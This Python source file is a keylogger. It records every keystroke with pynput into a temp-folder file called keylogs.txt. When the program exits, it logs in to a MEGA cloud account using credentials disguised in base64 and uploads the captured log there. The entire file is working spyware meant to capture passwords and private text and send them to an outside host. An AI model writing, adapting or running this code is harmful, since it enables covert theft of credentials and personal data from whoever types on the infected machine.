from pynput.keyboard import Key, Listener
from pynput import keyboard
import logging
from mega import Mega
import base64
import os

mail = '<YOUR-MAIL-IN-BASE64>'
passwd_enc = '<YOUR-PASSWORD-IN-BASE64>'

log_dir = ""
path = tempfile.gettempdir()

def upload_mega():
    mega = Mega()
    m = mega.login(base64.b64decode(mail).decode('utf-8'), base64.b64decode(passwd_enc).decode('utf-8'))
    filename = tempfile.gettempdir() + "\\keylogs.txt"
    m.upload(filename)

atexit.register(upload_mega)

logging.basicConfig(filename=(log_dir + path + "\\keylogs.txt"), \
	level=logging.DEBUG, format='%(message)s')

def on_press(key):
    logging.info(str(key))
    if key == keyboard.Key.backspace:
        with open(path + '\\keylogs.txt', 'rb+') as f:
            f.read()
            f.seek(-20, os.SEEK_END)
            f.truncate()

def on_release(key):
    if key == keyboard.Key.f8:
        with open(path + '\\keylogs.txt', 'rb+') as f,open(path + '\\keylogs.txt', 'r+') as w:
            f.read()
            f.seek(-8, os.SEEK_END)
            f.truncate()
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()

with open(path + '\\keylogs.txt', 'r') as f:
    lines = f.readlines()
with open(path + '\\keylogs.txt', 'w') as f:
    for line in lines:
        line=line.replace("\n","")
        line=line.replace("Key.space"," ")
        line=line.replace("Key.enter","\n---Enter---\n")
        line=line.replace("'","")
        line=line.replace("Key.shift_r","")
        f.write(line)
    f.write("\n\n")
